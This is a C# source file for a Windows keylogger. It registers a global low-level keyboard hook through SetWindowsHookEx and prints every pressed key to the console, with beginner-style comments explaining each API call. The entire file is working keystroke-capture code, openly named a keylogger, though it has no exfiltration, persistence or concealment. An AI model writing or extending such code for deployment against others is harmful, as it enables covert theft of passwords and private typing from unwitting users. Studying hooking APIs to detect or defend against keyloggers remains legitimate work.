using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace Keylogger
{
    class Program
    {
        //Variables for the private methods
        private static int WH_KEYBOARD_LL = 13;         //WHKEYBOARD a hook procedure. A hook procedure is a function that intercepts specific events, can act on each event it receives, and then modify or discard the event. 13 will allow a hook procedure to work with a low level keyboard inputs.
        private static int WH_KEYDOWN = 0x0100;         //WHKEYDOWN compared with a IntPtr variable if the key represented by the variable has a value of 0x0100 or 265 then a nonsystem key (a key pressed without the alt key) is recognized and logged
        private static IntPtr hook = IntPtr.Zero;       //the hook procedure montiors low level keyboard function
        private static LowLevelKeyboardProc KeyBrdProcdre = HookCallback;   //HookCallback defines what to do when a keyboard input is entered


        static void Main(string[] args)
        {
            hook = SetHook(KeyBrdProcdre);      //hook is defined 
            Application.Run();                  //runs a standard application meessage loop
            UnhookWindowsHookEx(hook);          //removes the hook and stop keylogging

        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WH_KEYDOWN)  //nCode determines how to process the message, if nCode < 0 message goes to CallNextHookEx function | Param > identifier of keyboard message 
            { 
                int vkCode = Marshal.ReadInt32(lParam);     //number stored for lParam, the integer is from the key pressed
                Console.Write((Keys)vkCode);                //"Key" used to convert int value of the key pressed to a readable format
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)        //sethook function helps build and return setwindows
        {
            Process currentProcess = Process.GetCurrentProcess();       
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, KeyBrdProcdre, moduleHandle, 0);
        }

        [DllImport("user32.dll")]   //import CallNextHookEx
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]   //sethook function defined
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]   
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);




    }
}
